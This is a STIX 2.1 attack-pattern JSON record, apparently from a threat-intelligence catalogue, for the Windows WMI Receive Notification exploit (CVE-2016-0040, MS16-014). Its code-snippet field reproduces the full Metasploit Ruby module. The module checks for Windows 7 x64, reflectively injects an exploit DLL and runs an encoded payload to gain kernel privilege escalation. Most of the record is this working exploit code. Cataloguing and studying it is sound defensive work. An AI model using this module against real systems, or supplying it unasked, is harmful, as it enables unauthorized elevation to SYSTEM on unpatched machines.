{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b4c3b4c2-0ef0-4e2b-a2c5-6d110f2e1eb0",
    "created": "2024-08-14T16:49:07.207144Z",
    "modified": "2024-08-14T16:49:07.207148Z",
    "name": "Windows WMI Receive Notification Exploit",
    "description": " This module exploits an uninitialized stack variable in the WMI subsystem of ntoskrnl. This module has been tested on vulnerable builds of Windows 7 SP0 x64 and Windows 7 SP1 x64.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/ms16_014_wmi_recv_notif.rb",
            "external_id": "ms16_014_wmi_recv_notif.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-0040"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/de7ec7ed/CVE-2016-0040"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/Rootkitsmm/cve-2016-0040"
        },
        {
            "source_name": "reference",
            "url": "https://technet.microsoft.com/en-us/library/security/ms16-014.aspx"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = NormalRanking\n\n  include Msf::Post::File\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Process\n  include Msf::Post::Windows::FileInfo\n  include Msf::Post::Windows::ReflectiveDLLInjection\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows WMI Receive Notification Exploit',\n        'Description' => %q{\n          This module exploits an uninitialized stack variable in the WMI subsystem of ntoskrnl.\n          This module has been tested on vulnerable builds of Windows 7 SP0 x64 and Windows 7 SP1 x64.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'smmrootkit',      # crash code\n          'de7ec7ed',        # exploit code\n          'de7ec7ed',        # msf module\n        ],\n        'Arch' => [ARCH_X64],\n        'Platform' => 'win',\n        'SessionTypes' => ['meterpreter'],\n        'DefaultOptions' => {\n          'EXITFUNC' => 'thread'\n        },\n        'Targets' => [\n          ['Windows 7 SP0/SP1', { 'Arch' => ARCH_X64 }]\n        ],\n        'Payload' => {\n          'Space' => 4096,\n          'DisableNops' => true\n        },\n        'References' => [\n          ['CVE', '2016-0040'],\n          ['MSB', 'MS16-014'],\n          ['URL', 'https://github.com/de7ec7ed/CVE-2016-0040'],\n          ['URL', 'https://github.com/Rootkitsmm/cve-2016-0040'],\n          ['URL', 'https://technet.microsoft.com/en-us/library/security/ms16-014.aspx']\n        ],\n        'DisclosureDate' => '2015-12-04',\n        'DefaultTarget' => 0\n      )\n  )\n  end\n\n  def check\n    # Windows 7 SP0/SP1 (64-bit)\n\n    unless session.platform == 'windows'\n      return Exploit::CheckCode::Unknown\n    end\n\n    version = get_version_info\n    vprint_status(\"OS Version: #{version.product_name}\")\n\n    return Exploit::CheckCode::Safe unless version.build_number.between?(Msf::WindowsVersion::Win7_SP0, Msf::WindowsVersion::Win7_SP1) && version.workstation?\n\n    return Exploit::CheckCode::Appears\n  end\n\n  def exploit\n    if is_system?\n      fail_with(Failure::None, 'Session is already elevated')\n    end\n\n    check_result = check\n    if check_result == Exploit::CheckCode::Safe || check_result == Exploit::CheckCode::Unknown\n      fail_with(Failure::NotVulnerable, 'Exploit not available on this system.')\n    end\n\n    if sysinfo['Architecture'] == ARCH_X64 && session.arch == ARCH_X86\n      fail_with(Failure::NoTarget, 'Running against WOW64 is not supported')\n    end\n\n    # invoke the exploit, passing in the address of the payload that\n    # we want invoked on successful exploitation.\n    print_status('Reflectively injecting the exploit DLL and running it...')\n    encoded_payload = payload.encoded\n    execute_dll(\n      ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2016-0040', 'CVE-2016-0040.x64.dll'),\n      encoded_payload\n    )\n\n    print_good('Exploit finished, wait for (hopefully privileged) payload execution to complete.')\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-12-04",
    "x_mitre_platforms": [
        "win'"
    ]
}